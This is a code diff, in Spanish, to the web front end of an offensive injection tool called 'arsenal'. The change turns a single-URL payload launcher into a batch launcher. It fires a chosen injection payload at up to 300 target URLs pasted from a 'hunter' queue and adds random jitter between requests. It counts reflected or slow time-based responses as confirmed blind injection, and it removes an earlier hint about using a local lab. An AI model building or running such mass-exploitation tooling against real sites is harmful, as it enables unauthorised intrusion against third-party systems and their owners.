@@ -167,12 +167,16 @@
     <div class="card-red">
       <div class="card-head"><h3>🎯 PASO 2 · Blanco</h3></div>
       <div class="card-body">
-        <label>URL objetivo del payload</label>
-        <input type="url" id="targetUrl" placeholder="https://blanco.com/page.php?dato={INJECT}" />
+        <label>Blancos (uno por línea — pega la cola del hunter o de tu lista)</label>
+        <textarea id="targetsBox" rows="6" style="width:100%;background:#060904;border:1px solid var(--red-dim);color:var(--text);padding:0.55rem 0.6rem;font-family:inherit;font-size:0.85rem;border-radius:2px;min-height:110px" placeholder="https://blanco.com/page.php?dato={INJECT}&#10;https://blanco2.com/buscar?q={INJECT}"></textarea>
         <div class="hint" style="color:var(--muted);font-size:0.7rem;margin-top:0.35rem">
-          Poné <code>{INJECT}</code> donde va el payload. Si la URL no lo tiene, el payload se agrega como
-          <code>?q=payload</code>. Para lab: <code>http://127.0.0.1:8000/...</code>
+          Poné <code>{INJECT}</code> donde va el payload; si no está, se agrega como <code>?q=</code>.
+          Con varias líneas el payload elegido vuela a TODAS en lote (jitter entre disparos).
         </div>
+        <label style="display:flex;align-items:center;gap:0.4rem;color:var(--text);font-size:0.8rem">
+          <input type="checkbox" id="stopImpact" checked style="width:1rem;height:1rem;accent-color:var(--red)" />
+          🛑 stop al primer impacto confirmado (demostración mínima)
+        </label>
       </div>
     </div>
 
@@ -290,41 +294,84 @@
       }
     }
 
-    async function fire() {
-      const target = document.getElementById("targetUrl").value.trim();
-      if (!SELECTED || !target) return;
-      const btn = document.getElementById("fireBtn");
-      btn.disabled = true; btn.textContent = "🔥 LANZANDO...";
-      document.getElementById("result").style.display = "block";
-      document.getElementById("rBody").textContent = "esperando respuesta...";
-      try {
-        const r = await fetch("/api/arsenal/fire", {
-          method: "POST", headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ token: TOKEN, target: target, payload: SELECTED.payload, nombre: SELECTED.nombre })
-        });
-        const d = await r.json();
-        if (!r.ok) {
-          document.getElementById("rStatus").textContent = "ERROR " + r.status;
-          document.getElementById("rBody").textContent = d.error || "error";
-          return;
-        }
-        document.getElementById("rStatus").textContent = d.status_code;
-        const tEl = document.getElementById("rTime");
-        tEl.textContent = d.elapsed_ms + " ms";
-        tEl.className = d.elapsed_ms > 3000 ? "slow" : "";
-        const refl = document.getElementById("rRefl");
-        refl.textContent = d.reflejado ? "SÍ" : "no";
-        refl.style.color = d.reflejado ? "var(--amber)" : "";
-        document.getElementById("rBody").textContent = d.body_head || "(sin cuerpo)";
-        if (d.elapsed_ms > 3000 && /sleep|benchmark|waitfor|blob/i.test(SELECTED.payload))
-          document.getElementById("rBody").textContent =
-            "💥 CONFIRMADO: respuesta lenta con payload temporal = inyección ciega probable.\n\n" + (d.body_head || "");
-      } catch (e) {
-        document.getElementById("rBody").textContent = "error: " + e.message;
-      } finally {
-        btn.disabled = false; btn.textContent = "🔥 LANZAR AL BLANCO";
-      }
+    function confirmo(sel, d) {
+      return (d.elapsed_ms > 3000 && /sleep|benchmark|waitfor|blob/i.test(sel.payload)) || d.reflejado;
     }
+
+    const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+    async function fireOne(target, sel) {
+      const r = await fetch("/api/arsenal/fire", {
+        method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ token: TOKEN, target: target, payload: sel.payload, nombre: sel.nombre })
+      });
+      const d = await r.json();
+      return { ok: r.ok, d, target };
+    }
+
+    function pintaRes(d, sel) {
+      document.getElementById("rStatus").textContent = d.status_code;
+      const tEl = document.getElementById("rTime");
+      tEl.textContent = d.elapsed_ms + " ms";
+      tEl.className = d.elapsed_ms > 3000 ? "slow" : "";
+      const refl = document.getElementById("rRefl");
+      refl.textContent = d.reflejado ? "SÍ" : "no";
+      refl.style.color = d.reflejado ? "var(--amber)" : "";
+      let head = d.body_head || "(sin cuerpo)";
+      if (d.elapsed_ms > 3000 && /sleep|benchmark|waitfor|blob/i.test(sel.payload))
+        head = "💥 CONFIRMADO: respuesta lenta con payload temporal = inyección ciega probable.\n\n" + head;
+      return head;
+    }
+
+    async function fire() {
+      const raw = document.getElementById("targetsBox").value.trim();
+      const lines = raw ? raw.split(/\n+/).map(x => x.trim()).filter(Boolean).slice(0, 300) : [];
+      if (!SELECTED || !lines.length) return alert("Elegí un payload y poné al menos una URL");
+      const btn = document.getElementById("fireBtn");
+      const stop = document.getElementById("stopImpact").checked;
+      btn.disabled = true;
+      document.getElementById("result").style.display = "block";
+
+      let conf = 0, lento = 0, refl = 0, errs = 0, out = "";
+      for (let i = 0; i < lines.length; i++) {
+        btn.textContent = `🔥 ${i + 1}/${lines.length}...`;
+        const target = lines[i];
+        out += `── [${i + 1}/${lines.length}] ${target}\n`;
+        try {
+          const { ok, d } = await fireOne(target, SELECTED);
+          if (!ok) { errs++; out += "   ERROR: " + (d.error || d.status) + "\n"; }
+          else {
+            const head = pintaRes(d, SELECTED);
+            if (d.elapsed_ms > 3000) lento++;
+            if (d.reflejado) refl++;
+            if (confirmo(SELECTED, d)) conf++;
+            out += `   estado ${d.status_code} · ${d.elapsed_ms}ms · reflejado: ${d.reflejado ? "SÍ" : "no"}\n`;
+            out += (d.elapsed_ms > 3000 && /sleep|benchmark|waitfor|blob/i.test(SELECTED.payload))
+              ? "   💥 CONFIRMADO (ciego temporal)\n" : "";
+            if (i === lines.length - 1) out += "\n" + head;
+            if (stop && confirmo(SELECTED, d)) {
+              out += `\n🛑 STOP: impacto confirmado en el blanco ${i + 1} (demostración mínima).`;
+              break;
+            }
+          }
+        } catch (e) { errs++; out += "   error: " + e.message + "\n"; }
+        document.getElementById("rBody").textContent = out;
+        document.getElementById("rBody").scrollTop = 1e9;
+        if (i < lines.length - 1) await sleep(400 + Math.floor(Math.random() * 400));
+      }
+      out += `\n═══ LOTE: ${lines.length} blancos · 💥 confirmados: ${conf} · lentos(>3s): ${lento} · reflejados: ${refl} · errores: ${errs} ═══`;
+      document.getElementById("rBody").textContent = out;
+      document.getElementById("rBody").scrollTop = 1e9;
+      btn.disabled = false; btn.textContent = "🔥 LANZAR AL BLANCO";
+    }
+
+    try {
+      const pre = sessionStorage.getItem("arsenal_targets");
+      if (pre) {
+        document.getElementById("targetsBox").value = JSON.parse(pre).join("\n");
+        sessionStorage.removeItem("arsenal_targets");
+      }
+    } catch (e) {}
 
     fetch("/api/status").then(r => r.json()).then(d => {
       document.getElementById("appVersion").textContent = "v" + (d.version || "?");
